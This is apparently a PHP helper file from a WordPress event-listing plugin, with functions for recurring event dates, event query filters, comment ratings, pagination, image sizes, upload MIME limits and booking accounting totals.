if ( ! function_exists( 'get_recurrence_days' ) ) {
	function get_recurrence_days( $recurrence_freq, $recurrence_interval, $recurrence_bydays, $recurrence_byweekno, $recurrence_byday, $start_date, $end_date ){
		/* get timestampes for start and end dates, both at 12AM */
		$start_date = (new DateTime($start_date))->setTime(0,0,0);
		$end_date = (new DateTime($end_date))->setTime(0,0,0);
		$start_date_str = $start_date->getTimestamp();
		$end_date_str = $end_date->getTimestamp();
		$weekdays = $recurrence_bydays; //what days of the week (or if monthly, one value at index 0)
		$weekday = $recurrence_byday; //what day of the week

		$matching_days = array(); //the days we'll be returning in timestamps
		/* generate matching dates based on frequency type */
		switch ( $recurrence_freq ){
			case 'daily':
			/* If daily, it's simple. Get start date, add interval timestamps to that and create matching day for each interval until end date.*/
			$current_date = $start_date;
			while( $current_date->getTimestamp() <= $end_date_str ){
				$matching_days[] = $current_date->getTimestamp();
				$current_date->add( new DateInterval('P'.$recurrence_interval.'D') ) ;
			}
			break;

			case 'weekly':
			/* sort out week one, get starting days and then days that match time span of event (i.e. remove past events in week 1) */
			$current_date = $start_date;
			$start_of_week = get_option('start_of_week'); //Start of week depends on WordPress

			/* then get the timestamps of weekdays during this first week, regardless if within event range */
			$start_weekday_dates = array(); //Days in week 1 where there would events, regardless of event date range
			for($i = 0; $i < 7; $i++){
				if( in_array( $current_date->format('w'), $weekdays) ){
					$start_weekday_dates[] = $current_date->getTimestamp(); //it's in our starting week day, so add it
				}
				$current_date->add( new DateInterval('P1D') ); //add a day
			}

			/* for each day of eventful days in week 1, add 7 days * weekly intervals */
			foreach ($start_weekday_dates as $weekday_date){
				/* Loop weeks by interval until we reach or surpass end date */
				$current_date->setTimestamp($weekday_date);
				while($current_date->getTimestamp() <= $end_date_str){
					if( $current_date->getTimestamp() >= $start_date_str && $current_date->getTimestamp() <= $end_date_str ){
						$matching_days[] = $current_date->getTimestamp();
					}
					$current_date->add( new DateInterval('P'. ($recurrence_interval * 7 ) .'D'));
				}
			} 
			break; 

			case 'monthly':
			/* loop months starting this month by intervals */
			$current_date = $start_date->modify('first day of this month'); //Start date on first day of month
			while( $current_date->getTimestamp() <= $end_date_str ){
				$last_day_of_month = $current_date->format('t');
				/* Now find which day we're talking about */
				$current_week_day = $current_date->format('w');
				$matching_month_days = array();
				/* Loop through days of this years month and save matching days to temp array */
				for($day = 1; $day <= $last_day_of_month; $day++){
					if((int) $current_week_day == $weekday){
						$matching_month_days[] = $day;
					}
					$current_week_day = ($current_week_day < 6) ? $current_week_day + 1 : 0;							
				}
				/* Now grab from the array the x day of the month */
				$matching_day = false;
				if( $recurrence_byweekno > 0 ){
					/* date might not exist (e.g. fifth Sunday of a month) so only add if it exists */
					if( !empty($matching_month_days[$recurrence_byweekno-1]) ){
						$matching_day = $matching_month_days[$recurrence_byweekno-1];
					}
				}else{
					/* last day of month, so we pop the last matching day */
					$matching_day = array_pop($matching_month_days);
				}
				/* if we have a matching day, get the timestamp, make sure it's within our start/end dates for the event, and add to array if it is */
				if( !empty($matching_day) ){
					$matching_date = $current_date->setDate( $current_date->format('Y'), $current_date->format('m'), $matching_day )->getTimestamp();
					if($matching_date >= $start_date_str && $matching_date <= $end_date_str){
						$matching_days[] = $matching_date;
					}
				}
				/* add the monthly interval to the current date */
				$current_date->add( new DateInterval('P'.$recurrence_interval.'M') )->modify('first day of this month');
			}
			break;

			case 'yearly':
			/* Yearly is easy, we get the start date as a cloned EL_DateTime and keep adding a year until it surpasses the end EL_DateTime value. */
			$EL_DateTime = $start_date;
			while( $EL_DateTime <= $end_date ){
				$matching_days[] = $EL_DateTime->getTimestamp();
				$EL_DateTime->add( new DateInterval('P'.$recurrence_interval.'Y'));
			}			
			break;
		}
		sort($matching_days);
		return apply_filters('el_events_get_recurrence_days', $matching_days);
		
	}
}

if ( ! function_exists('get_arr_list_calendar_by_id_event') ) {
	function get_arr_list_calendar_by_id_event ( $id_event ) {
		$option_calendar = get_post_meta( $id_event, OVA_METABOX_EVENT . 'option_calendar' );
		$option = "";
		if (is_array($option_calendar) && isset($option_calendar[0]) ) {
			$option = $option_calendar[0];
		}

		switch ( $option ) {
			case "manual" : {
				$calendars = get_post_meta( $id_event, OVA_METABOX_EVENT.'calendar', true );
				break;
			}
			case "auto" : {
				$calendars = get_post_meta( $id_event, OVA_METABOX_EVENT.'calendar_recurrence', true );
				break;
			}
			default : {
				$calendars = [];
			}
		}
		return $calendars;
	}
}



function el_get_calendar_core( $id_event, $id_cal ){
	if( ! $id_event || ! $id_cal ) return;
	$list_calendar = get_arr_list_calendar_by_id_event($id_event);

	if( is_array($list_calendar) && !empty($list_calendar) ){
		foreach ($list_calendar as $key => $cal) {
			if( (string)$cal['calendar_id'] === $id_cal ) {
				return $cal;
			}
		}
	}

	return;
}

/* Only Show User Images Upload */
function only_show_user_images( $query = array() ) {
	$current_userID = get_current_user_id();
	if ( $current_userID && !current_user_can('administrator')) {
		$query['author'] = $current_userID;
	}
	return $query;
}
add_filter( 'ajax_query_attachments_args', 'only_show_user_images' );


function hex2rgb($hex) {
	$hex = str_replace("#", "", $hex);

	if(strlen($hex) == 3) {
		$r = hexdec(substr($hex,0,1).substr($hex,0,1));
		$g = hexdec(substr($hex,1,1).substr($hex,1,1));
		$b = hexdec(substr($hex,2,1).substr($hex,2,1));
	} else {
		$r = hexdec(substr($hex,0,2));
		$g = hexdec(substr($hex,2,2));
		$b = hexdec(substr($hex,4,2));
	}
	$rgb = array($r, $g, $b);

	return $rgb; 
}

function pagination_vendor($total, $paged = null) {

	$current_page = (empty($paged)) ? get_query_var( 'paged' ) : $paged;

	$html = '<nav class="el-pagination">';
	$html .= paginate_links( apply_filters( 'el_pagination_args', array(
		'base'         => esc_url_raw( str_replace( 999999999, '%#%', get_pagenum_link( 999999999, false ) ) ),
		'format'       => '',
		'add_args'     => '',
		'current'      => max( 1,  $current_page),
		'total'        => $total,
		'prev_text'    => __( 'Previous', 'eventlist' ),
		'next_text'    => __( 'Next', 'eventlist' ),
		'type'         => 'list',
		'end_size'     => 3,
		'mid_size'     => 3
	) ) );
	$html .= '</nav>';
	return $html;
}

add_action('after_setup_theme', 'el_hooks');
function el_hooks(){
	/* Image thumbnail event author page */
	$el_thumbnail = apply_filters( 'el_thumbnail', array( 150, 150 ) );
	add_image_size( 'el_thumbnail', $el_thumbnail[0], $el_thumbnail[1], false );

	/* Image thumbnail event author page */
	$thumbnail_single_page = apply_filters( 'thumbnail_single_page', array( 1920, 739 ) );
	add_image_size( 'thumbnail_single_page', $thumbnail_single_page[0], $thumbnail_single_page[1], true );

	// Image for archive
	$el_img_rec = apply_filters( 'el_img_rec', array( 710, 355 ) );
	add_image_size( 'el_img_rec', $el_img_rec[0], $el_img_rec[1], true );

	$el_img_squa = apply_filters( 'el_img_squa', array( 710, 480 ) );
	add_image_size( 'el_img_squa', $el_img_squa[0], $el_img_squa[1], true );
}



/* Create the rating interface. */
add_action( 'comment_form_before_fields', 'comment_rating_field' );
add_action( 'comment_form_logged_in_after', 'comment_rating_field' );

function comment_rating_field () {
	if ( is_singular( 'event' ) ) {
		?>
		<div class="wrap_rating">
			<label for="rating" class="second_font"><?php esc_html_e( 'Rating', 'eventlist' ); ?></label>
			<fieldset class="comments-rating">
				<span class="rating-container">
					<?php for ( $i = 5; $i >= 1; $i-- ) : ?>
						<input type="radio" id="rating-<?php echo esc_attr( $i ); ?>" name="rating" value="<?php echo esc_attr( $i ); ?>" data-value="<?php echo esc_attr( $i ); ?>"/>
						<label class="star" for="rating-<?php echo esc_attr( $i ); ?>" ><?php echo esc_html( $i ); ?></label>
					<?php endfor; ?>
				</span>
			</fieldset>
		</div>
		<?php
	}
}

/* Save the rating submitted by the user. */
add_action( 'comment_post', 'comment_rating_save' );
function comment_rating_save( $comment_id ) {
	if ( ( isset( $_POST['rating'] ) ) && ( '' !== $_POST['rating'] ) ) {
		$rating = intval( $_POST['rating'] );
	} elseif ( !isset( $_POST['rating'] ) || 0 === intval( $_POST['rating'] || '' !== $_POST['rating'] ) )  {
		$rating = 0;
	}

	if($rating > 5) $rating = 5 ;

	add_comment_meta( $comment_id, 'rating', $rating );
}

/* Display the rating on a submitted comment. */
// add_filter( 'comment_text', 'comment_rating_display_rating');
function comment_rating_display_rating(){
	$comment_text = '';
	if ( $rating = get_comment_meta( get_comment_ID(), 'rating', true ) ) {
		$stars = '<p class="stars">';
		for ( $i = 1; $i <= 5; $i++ ) {
			if ( $i <= $rating ) {
				$stars .= '<span class="icon_star"></span>';
			} else {
				$stars .= '<span class="icon_star_alt"></span>';
			}
		}
		$stars .= '</p>';
		$count_stars = '<p class="count_star">'.esc_html($rating).'</p>';
		$comment_text = $comment_text . $count_stars . $stars;
		return $comment_text;
	} else {
		return $comment_text;
	}
}

//function sub string in word
function sub_string_word ($content = "", $number = 0) {
	$content = sanitize_text_field($content);
	$number = (int)$number;
	if (empty($content) || empty($number)) return $content;
	$sub_string = substr($content, 0, $number);
	if( $sub_string == $content ) return $content;
	$content = substr($sub_string, 0, strrpos($sub_string, ' ', 0));
	return $content.'...';
}

// date time format
if ( ! function_exists( 'el_date_time_format_js' ) ) {
	function el_date_time_format_js() {
		
		// set detault datetime format datepicker
		$EL_Setting = EL()->options->general;

		$date_format = $EL_Setting->get( 'cal_date_format', 'dd-mm-yy' ) ? __( $EL_Setting->get( 'cal_date_format', 'dd-mm-yy' ), 'eventlist' ) : 'dd-mm-yy';
		

		return apply_filters( 'el_date_time_format_js', $date_format );
	}
}

// date time format reverse
if ( ! function_exists( 'el_date_time_format_js_reverse' ) ) {
	function el_date_time_format_js_reverse($dateFormat) {
		// set detault datetime format datepicker

		switch ( $dateFormat ) {

			case 'dd-mm-yy':
			$return = 'd-m-Y';
			break;

			case 'mm/dd/yy':
			$return = 'm/d/Y';
			break;


			case 'yy/mm/dd':
			$return = 'Y/m/d';
			break;

			case 'yy-mm-dd':
			$return = 'Y-m-d';
			break;


			default:
			$return = 'd-m-Y';
			break;
		}

		return apply_filters( 'el_date_time_format_js_reverse', $return );
	}
}

// Get full list languge calendar
if (! function_exists( 'el_get_calendar_language' )) {
	function el_get_calendar_language() {

		$symbols = array(
			'en-GB' => 'English/UK',
			'af' => 'Afrikaans',
			'ar-DZ' => 'Algerian Arabic',
			'ar' => 'Algerian',
			'ar' => 'Arabic',
			'az' => 'Azerbaijani',
			'be' => 'Belarusian',
			'bg' => 'Bulgarian',
			'bs' => 'Bosnian',
			'ca' => 'Inicialització',
			'cs' => 'Czech',
			'cy-GB' => 'Welsh/UK',
			'da' => 'Danish',
			'de' => 'German',
			'el' => 'Greek',
			'en-AU' => 'English/Australia',
			'en-NZ' => 'English/New Zealand',
			'eo' => 'Esperanto',
			'es' => 'Inicialización',
			'et' => 'Estonian',
			'eu' => 'Karrikas-ek',
			'fa' => 'Persian (Farsi)',
			'fi' => 'Finnish',
			'fo' => 'Faroese',
			'fr-CA' => 'Canadian-French',
			'fr-CH' => 'Swiss-French',
			'fr' => 'French',
			'gl' => 'Galician',
			'he' => 'Hebrew',
			'hi' => 'Hindi',
			'hr' => 'Croatian',
			'hu' => 'Hungarian',
			'hy' => 'Armenian',
			'id' => 'Indonesian',
			'is' => 'Icelandic',
			'it-CH' => 'Italian',
			'ja' => 'Japanese',
			'ka' => 'Georgian',
			'kk' => 'Kazakh',
			'km' => 'Khmer',
			'ko' => 'Korean',
			'ky' => 'Kyrgyz',
			'lb' => 'Luxembourgish',
			'lt' => 'Lithuanian',
			'lv' => 'Latvian',
			'mk' => 'Macedonian',
			'ml' => 'Malayalam',
			'ms' => 'Malaysian',
			'nb' => 'Norwegian Bokmål',
			'nl-BE' => 'Dutch (Belgium)',
			'nl' => 'Dutch',
			'nn' => 'Norwegian Nynorsk',
			'no' => 'Norwegian',
			'pl' => 'Polish',
			'pt-BR' => 'Brazilian',
			'pt' => 'Portuguese',
			'rm' => 'Romansh',
			'ro' => 'Romanian',
			'ru' => 'Russian',
			'sk' => 'Slovak',
			'sl' => 'Slovenian',
			'sq' => 'Albanian',
			'sr-SR' => 'Serbian',
			'sr' => 'Serbian',
			'sv' => 'Swedish',
			'ta' => 'Tamil',
			'th' => 'Thai',
			'tj' => 'Tajiki',
			'tr' => 'Turkish',
			'uk' => 'Ukrainian',
			'vi' => 'Vietnamese',
			'zh-CN' => 'Chinese',
			'zh-HK' => 'Chinese (Hong Kong)',
			'zh-TW' => 'Chinese (Taiwan)',
		);

		return apply_filters( 'el_get_calendar_language', $symbols );
	}
}

if ( ! function_exists('get_profit_by_id_event')) {
	function get_profit_by_id_event($id_event = null) {
		if ($id_event == null) return ;

		$list_booking_complete_by_id_event = EL_Booking::instance()->get_list_booking_complete_by_id_event($id_event);
		$number_booking = EL_Booking::instance()->get_number_booking_id_event($id_event);
		$total_after_tax = $total_before_tax = 0;
		if (!empty($list_booking_complete_by_id_event) && is_array($list_booking_complete_by_id_event)) {
			foreach($list_booking_complete_by_id_event as $booking) {
				$total_after_tax += (float)(get_post_meta( $booking->ID, OVA_METABOX_EVENT . 'total_after_tax', true ));
				$total_before_tax += (float)get_post_meta( $booking->ID, OVA_METABOX_EVENT .'total', true );
			}
		}
		
		$list_ticket_by_id_event = EL_Ticket::instance()->get_list_ticket_by_id_event($id_event);
		

		$number_ticket = count($list_ticket_by_id_event);
		$number_ticket_free = EL_Ticket::instance()->get_number_ticket_free_by_id_event($id_event);
		$number_ticket_paid = $number_ticket - $number_ticket_free; 

		$package_id = get_post_id_package_by_event($id_event);
		$fee_percent_paid_ticket = (float)get_post_meta( $package_id, OVA_METABOX_EVENT . 'fee_percent_paid_ticket', true );
		$fee_default_paid_ticket = (float)get_post_meta( $package_id, OVA_METABOX_EVENT . 'fee_default_paid_ticket', true );

		$fee_percent_free_ticket = (float)get_post_meta( $package_id, OVA_METABOX_EVENT . 'fee_percent_free_ticket', true );
		$fee_default_free_ticket = (float)get_post_meta( $package_id, OVA_METABOX_EVENT . 'fee_default_free_ticket', true );
		

		$total_admin = ($fee_percent_paid_ticket * $total_before_tax) / 100 + $number_ticket_paid * $fee_default_paid_ticket + $fee_default_free_ticket * $number_ticket_free;
		$profit = $total_after_tax - $total_admin;
		return apply_filters('el_get_profit_id_event', $profit);
	}
}

if ( !function_exists('el_pagination_event_ajax') ) {
	function el_pagination_event_ajax( $total, $limit, $current  ) {

		$pages = ceil($total / $limit);

		if ($pages > 1) {
			?>
			<input type="hidden" name="pagination_submit" value="1">
			<ul class="page-numbers">

				<?php if( $current > 1 ) { ?>
					<li><a href="#"><span data-paged="<?php echo esc_attr($current - 1); ?>" class="prev page-numbers" ><?php esc_html_e( 'Previous', 'eventlist' ); ?></span></a></li>
				<?php } ?>

				<?php for ($i = 1; $i < $pages+1; $i++) { ?>
					<li><a href="#"><span data-paged="<?php echo esc_attr($i); ?>" class="page-numbers <?php echo esc_attr( ($current == $i) ? 'current' : '' ); ?>"><?php echo esc_html($i); ?></span></a></li>
				<?php } ?>

				<?php if( $current < $pages ) { ?>
					<li><a href="#"><span data-paged="<?php echo esc_attr($current + 1); ?>" class="next page-numbers" ><?php esc_html_e( 'Next', 'eventlist' ); ?></span></a></li>
				<?php } ?>

			</ul>
			<?php
		}
	}
}

if ( !function_exists('get_number_event_by_seting_element_cat') ) {
	function get_number_event_by_seting_element_cat ( $category, $filter_event ) {
		$current_time = current_time( 'timestamp' );
		$agr_base = [
			'fields' => 'ids',
			'post_type' => 'event',
			'post_status' => 'publish',
			'posts_per_page' => -1, 
			'numberposts' => -1,
			'nopaging' => true,
		];

		$agrs_cat = [];
		if ($category != 'all') {
			$agrs_cat = [
				'tax_query' =>[
					[
						'taxonomy' => 'event_cat',
						'field' => 'slug',
						'terms' => $category,
					]
				]
			];
		}

		switch ( $filter_event ) {
			case 'feature' : {

				if( apply_filters( 'el_show_past_in_feature', true ) ){

					$agrs_status = [
						'meta_query' => [
							[
								'key' => OVA_METABOX_EVENT . 'event_feature',
								'value' => 'yes',
								'compare' => '=',
							],
						],
					];

				}else{

					$agrs_status = [
						'meta_query' => [
							'relation' => 'AND',
							[
								'key' => OVA_METABOX_EVENT . 'event_feature',
								'value' => 'yes',
								'compare' => '=',
							],
							[
								'key'      => OVA_METABOX_EVENT . 'end_date_str',
								'value'    => $current_time,
								'compare'  => '>'
							]
						],
					];

				}

				break;
			}
			case 'upcoming' : {

				$agrs_status = el_sql_upcoming();
				break;
			}
			case 'selling' : {
				$agrs_status = [
					'meta_query' => [
						'relation' => 'AND',
						[
							'key' => OVA_METABOX_EVENT . 'start_date_str',
							'value' => $current_time,
							'compare' => '<=',
						],
						[
							'key' => OVA_METABOX_EVENT . 'end_date_str',
							'value' => $current_time,
							'compare' => '>='
						]
					],
				];
				break;
			}

			case 'closed' : {
				$agrs_status = [
					'meta_query' => [
						[
							'key' => OVA_METABOX_EVENT . 'end_date_str',
							'value' => $current_time,
							'compare' => '<',
						]
					],
				];
				break;
			}

			default : {
				$agrs_status = [];
			}
		}

		$args = array_merge($agr_base, $agrs_status, $agrs_cat);
		$events = get_posts($args);
		$number_event = count($events);
		return $number_event;
	}
}


if ( !function_exists('get_number_event_by_seting_element_loc') ) {
	function get_number_event_by_seting_element_loc ( $id_loc, $filter_event ) {

		$current_time = current_time( 'timestamp' );
		$agr_base = [
			'fields' => 'ids',
			'post_type' => 'event',
			'post_status' => 'publish',
			'posts_per_page' => -1,
			'numberposts' => -1,
			'nopaging' => true,

		];

		switch ( $filter_event ) {
			case 'feature' : {

				if( apply_filters( 'el_show_past_in_feature', true ) ){

					$agrs_status = [
						'meta_query' => [
							[
								'key' => OVA_METABOX_EVENT . 'event_feature',
								'value' => 'yes',
								'compare' => '=',
							],
						],
					];

				}else{

					$agrs_status = [
						'meta_query' => [
							'relation' => 'AND',
							[
								'key' => OVA_METABOX_EVENT . 'event_feature',
								'value' => 'yes',
								'compare' => '=',
							],
							[
								'key'      => OVA_METABOX_EVENT . 'end_date_str',
								'value'    => $current_time,
								'compare'  => '>'
							]
						],
					];

				}
				break;
			}
			case 'upcoming' : {

				$agrs_status = el_sql_upcoming();
				
				break;
			}
			case 'selling' : {
				$agrs_status = [
					'meta_query' => [
						'relation' => 'AND',
						[
							'key' => OVA_METABOX_EVENT . 'start_date_str',
							'value' => $current_time,
							'compare' => '<=',
						],
						[
							'key' => OVA_METABOX_EVENT . 'end_date_str',
							'value' => $current_time,
							'compare' => '>='
						]
					],
				];
				break;
			}

			case 'closed' : {
				$agrs_status = [
					'meta_query' => [
						[
							'key' => OVA_METABOX_EVENT . 'end_date_str',
							'value' => $current_time,
							'compare' => '<',
						]
					],
				];
				break;
			}

			default : {
				$agrs_status = [];
			}
		}
		//end switch

		$agrs_loc = [];
		if ($id_loc) {
			$agrs_loc = [
				'tax_query' => [
					[
						'taxonomy' => 'event_loc',
						'field' => 'id',
						'terms' => $id_loc,
					],
				],
			];
		}

		$args = array_merge($agr_base, $agrs_status, $agrs_loc);

		$events = get_posts($args);
		$number_event = count($events);
		return $number_event;
	}
}

function get_list_event_grid_elementor ( $term_id_filter = null, $order = null, $order_by = null, $total_post = null, $filter_event = null ) {

	$current_time = current_time('timestamp');

	$args=[
		'post_type' => 'event',
		'post_status' => 'publish',
		'posts_per_page' => $total_post,
		'order' => $order,
		'tax_query' => [
			[
				'taxonomy' => 'event_cat',
				'field'    => 'id',
				'terms'    => $term_id_filter,
			]
		],
	];

	switch ($order_by) {
		case 'date':
		$args_orderby =  array( 'orderby' => 'date' );

		break;
		case 'title':
		$args_orderby =  array( 'orderby' => 'title' );
		break;

		case 'start_date':
		$args_orderby =  array( 'orderby' => 'meta_value_num', 'meta_key' => OVA_METABOX_EVENT.'start_date_str' );
		break;

		case 'id':
		$args_orderby =  array( 'orderby' => 'ID');
		break;

		default:
		break;
	}


	switch ( $filter_event ) {
		case 'feature' : {

			if( apply_filters( 'el_show_past_in_feature', true ) ){

				$agrs_status = [
					'meta_query' => [
						[
							'key' => OVA_METABOX_EVENT . 'event_feature',
							'value' => 'yes',
							'compare' => '=',
						],
					],
				];

			}else{

				$agrs_status = [
					'meta_query' => [
						'relation' => 'AND',
						[
							'key' => OVA_METABOX_EVENT . 'event_feature',
							'value' => 'yes',
							'compare' => '=',
						],
						[
							'key'      => OVA_METABOX_EVENT . 'end_date_str',
							'value'    => $current_time,
							'compare'  => '>'
						]
					],
				];

			}
			
			break;
		}
		case 'upcoming' : {
			
			$agrs_status = el_sql_upcoming();
			break;
		}
		case 'selling' : {
			$agrs_status = [
				'meta_query' => [
					'relation' => 'AND',
					[
						'key' => OVA_METABOX_EVENT . 'start_date_str',
						'value' => $current_time,
						'compare' => '<=',
					],
					[
						'key' => OVA_METABOX_EVENT . 'end_date_str',
						'value' => $current_time,
						'compare' => '>='
					]
				],
			];
			break;
		}

		case 'upcoming_selling': {
			$agrs_status = [
				'meta_query' => [
					'key'      => OVA_METABOX_EVENT . 'end_date_str',
					'value'    => $current_time,
					'compare'  => '>'
				],
			];
			break;
		}

		case 'closed' : {
			$agrs_status = [
				'meta_query' => [
					[
						'key' => OVA_METABOX_EVENT . 'end_date_str',
						'value' => $current_time,
						'compare' => '<',
					]
				],
			];
			break;
		}

		default : {
			$agrs_status = [];
		}
	}

	$args = array_merge($args, $agrs_status, $args_orderby );

	$events = new \WP_Query($args);
	return $events;
}

function get_term_id_filter_event_cat_element ( $include_cat = null, $show_all = null ) {
	
	$terms = get_term_by_cat_include ( $include_cat );
	$count = count($terms);
	$term_id_filter = array();
	$first_term = '';
	if (!empty($terms)) {
		$i = 0;
		foreach ( $terms as $term ) {
			$i++;
			$term_id_filter[] = $term->term_id;
			if ($i === 1) {
				$first_term = $term->term_id;
			}
		}
	}

	if ( $show_all === null ) {
		//return string id term
		$term_id_filter_string = implode(",", $term_id_filter);
		return $term_id_filter_string;
	}

	if ($show_all === 'yes' ) {
		//return array id term
		return $term_id_filter;
	} else {
		//return first id term
		return $first_term;
	}
}

function get_term_by_cat_include( $include_cat = null ) {
	$cat_include = [];
	if (!empty($include_cat)) {
		$cat_include =  explode(",",$include_cat);
	}

	$terms = get_terms([
		'taxonomy' => 'event_cat',
		'include' => $cat_include,
	]);

	return $terms;
}

function get_term_cat_event_by_slug_cat ($category = null) {
	$terms = get_term_by('slug', $category, 'event_cat' );
	$term['cat_name'] = !empty($terms->name) ? $terms->name : "";
	$term['link'] = !empty($terms->term_id) ? get_term_link($terms->term_id, 'event_cat') : '';
	return $term;
}

function get_term_loc_event_by_id_loc ( $id_loc = null ) {
	$terms = get_term_by('id', $id_loc, 'event_loc' );
	$term['loc_name'] = !empty($terms->name) ? $terms->name : "";
	$term['loc_link'] = !empty($terms->term_id) ? get_term_link($terms->term_id, 'event_loc') : '';
	return $term;
}

function get_list_event_slider_elementor ($category = null, $total_post = null, $order = null, $order_by = null, $filter_event = null) {
	$current_time = current_time('timestamp');

	$args = $args_orderby = [];
	if ($category == 'all') {
		$args=[
			'post_type' => 'event',
			'posts_per_page' => $total_post,
			'no_found_rows'	=> true,
			'order' => $order,
			'post_status' => 'publish',
		];
	} else {
		$args=[
			'post_type' => 'event',
			'post_status' => 'publish',
			'posts_per_page' => $total_post,
			'no_found_rows'	=> true,
			'order' => $order,
			'tax_query' => array(
				array(
					'taxonomy' => 'event_cat',
					'field'    => 'slug',
					'terms'    => $category,
				),
			),
		];
	}

	switch ($order_by) {
		case 'date':
		$args_orderby =  array( 'orderby' => 'date' );

		break;
		case 'title':
		$args_orderby =  array( 'orderby' => 'title' );
		break;

		case 'start_date':
		$args_orderby =  array( 'orderby' => 'meta_value_num', 'meta_key' => OVA_METABOX_EVENT.'start_date_str' );
		break;

		case 'id':
		$args_orderby =  array( 'orderby' => 'ID');
		break;

		default:
		break;
	}

	switch ( $filter_event ) {
		case 'feature' : {

			if( apply_filters( 'el_show_past_in_feature', true ) ){

				$agrs_status = [
					'meta_query' => [
						[
							'key' => OVA_METABOX_EVENT . 'event_feature',
							'value' => 'yes',
							'compare' => '=',
						],
					],
				];

			}else{

				$agrs_status = [
					'meta_query' => [
						'relation' => 'AND',
						[
							'key' => OVA_METABOX_EVENT . 'event_feature',
							'value' => 'yes',
							'compare' => '=',
						],
						[
							'key'      => OVA_METABOX_EVENT . 'end_date_str',
							'value'    => $current_time,
							'compare'  => '>'
						]
					],
				];

			}
			break;
		}
		case 'upcoming' : {
			
			$agrs_status = el_sql_upcoming();

			break;
		}
		case 'selling' : {
			$agrs_status = [
				'meta_query' => [
					'relation' => 'AND',
					[
						'key' => OVA_METABOX_EVENT . 'start_date_str',
						'value' => $current_time,
						'compare' => '<=',
					],
					[
						'key' => OVA_METABOX_EVENT . 'end_date_str',
						'value' => $current_time,
						'compare' => '>='
					]
				],
			];
			break;
		}

		case 'upcoming_selling': {
			$agrs_status = [
				'meta_query' => [
					'key'      => OVA_METABOX_EVENT . 'end_date_str',
					'value'    => $current_time,
					'compare'  => '>'
				],
			];
			break;
		}

		case 'closed' : {
			$agrs_status = [
				'meta_query' => [
					[
						'key' => OVA_METABOX_EVENT . 'end_date_str',
						'value' => $current_time,
						'compare' => '<',
					]
				],
			];
			break;
		}

		default : {
			$agrs_status = [];
		}
	}


	$args = array_merge($args, $agrs_status, $args_orderby);

	$events = new \WP_Query($args);
	return $events;
}

// Remove default size image in WordPress
function el_remove_default_image_sizes( $sizes) {
	
	unset( $sizes['thumbnail']);
	unset( $sizes['medium']);
	unset( $sizes['large']);
	unset( $sizes['medium_large']);
	return $sizes;
}
if( EL()->options->general->get('remove_img_size', 'yes') == 'yes' ){
	add_filter('intermediate_image_sizes_advanced', 'el_remove_default_image_sizes');
}

function el_remove_woo_image_sizes( $sizes) {	
	unset( $sizes['woocommerce_gallery_thumbnail'] );
	unset( $sizes['woocommerce_thumbnail'] );
	unset( $sizes['woocommerce_single'] );
	unset( $sizes['shop_thumbnail'] );
	unset( $sizes['shop_catalog'] );
	unset( $sizes['shop_single'] );
	return $sizes;
}
if( EL()->options->general->get( 'remove_woo_img_size', 'yes' ) == 'yes' ){
	add_filter('intermediate_image_sizes_advanced', 'el_remove_woo_image_sizes');
}

if ( !is_admin() ) {
	add_filter('upload_mimes','el_only_upload_image_file'); 
	function el_only_upload_image_file($mimes) { 
		$mimes = array( 
			'jpg|jpeg|jpe' => 'image/jpeg',
			'gif'          => 'image/gif',
			'png'          => 'image/png',
			'bmp'          => 'image/bmp',
			'tif|tiff'     => 'image/tiff',
			'ico'          => 'image/x-icon',
		);

		// Admin Allow Additional File Types to be Uploaded
		if ( EL()->options->general->get('event_upload_file', '') ) {
			$event_upload_file = explode(',', EL()->options->general->get('event_upload_file', '') );

			foreach ($event_upload_file as $value) {
				foreach ( wp_get_mime_types() as $k1 => $v1 ) {
					if ( trim($value) == $k1 ) {
						$mimes[$k1] = $v1;
					}
					if ( trim($value) == 'svg' ) {
						$mimes['svg'] = 'image/svg+xml';
					}
				}
			}
		}

		return $mimes;
	}
}

add_action( 'register_form', 'ova_vender_user_registration_form' );
function ova_vender_user_registration_form() {
	?>
	<p class="form-row">
		<span class="raido_input">
			<input type="radio" name="ova_type_user" value="vendor" id="vendor"><label for="vendor"><?php _e( 'Vendor', 'eventlist' ); ?></label>
		</span>
		<span class="raido_input">
			<input type="radio" name="ova_type_user" value="user" checked id="user"><label for="user"><?php _e( 'User', 'eventlist' ); ?></label>
		</span>
	</p>
	<?php
}

if ( EL()->options->general->get('allow_to_selling_ticket', 'yes') != 'yes' ) {
	function hidden_menu_post_type_ticket() {
		wp_enqueue_style('admin_fix_ticket', EL_PLUGIN_URI.'assets/css/admin/fix_ticket.css' );
	}
	add_action('admin_enqueue_scripts', 'hidden_menu_post_type_ticket');
}

if ( EL()->options->package->get('enable_package', 'no') != 'yes' ) {
	function hidden_menu_post_type_package() {
		wp_enqueue_style('admin_fix_package', EL_PLUGIN_URI.'assets/css/admin/fix_package.css' );
	}
	add_action('admin_enqueue_scripts', 'hidden_menu_post_type_package');
}


if ( ! function_exists( 'accounting_get_total_after_tax' ) ) {
	function accounting_get_total_after_tax ( $post_ID = array(), $after, $before ) {

		if( empty( $post_ID ) ) return 0;

		$agrs_base_booking = array(
			'post_type' => 'el_bookings',
			'post_status' => 'publish',
			'meta_query' => array(
				'relation' => 'AND',
				array(
					array(
						'key' => OVA_METABOX_EVENT . 'id_event',
						'value' => $post_ID,
						'compare' => 'IN'
					),
					array(
						'key' => OVA_METABOX_EVENT . 'status',
						'value' => 'completed'
					)
				)
			),
			'date_query' => array(
				array(
					'after' => $after,
					'before' => $before,
					'inclusive' => true
				)
			)
		);

		$args_booking = new WP_Query( $agrs_base_booking );

		$total_after_tax = 0;
		if( $args_booking->have_posts() ): while ( $args_booking->have_posts() ) : $args_booking->the_post();
			$total_after_tax += (float)get_post_meta( get_the_ID(), OVA_METABOX_EVENT . 'total_after_tax', true );
		endwhile; wp_reset_query(); endif;

		return $total_after_tax;
	}
}

if ( ! function_exists( 'accounting_get_data_total_after_tax' ) ) {
	function accounting_get_data_total_after_tax ( $after, $total_after_tax ) {
		$time_column = strtotime($after) * 1000;

		$data_total_after_tax = array(
			$time_column,
			$total_after_tax
		);

		return $data_total_after_tax ;
	}
}


if ( ! function_exists( 'accounting_get_total_user_registered' ) ) {
	function accounting_get_total_user_registered ( $role, $after, $before ) {
		$args = array(
			'role' => $role,
			'date_query' => array(
				array(
					'after' => $after,
					'before' => $before,
					'inclusive' => true
				)
			)
		);

		// $args_user = new WP_User_Query( $args );
		$users = get_users($args);
		return count($users);
	}
}

if ( ! function_exists( 'accounting_get_data_total_user_registered' ) ) {
	function accounting_get_data_total_user_registered ( $after, $total_user ) {
		$time_column = strtotime($after) * 1000;

		$data_total_user = array(
			$time_column,
			$total_user
		);

		return $data_total_user ;
	}
}




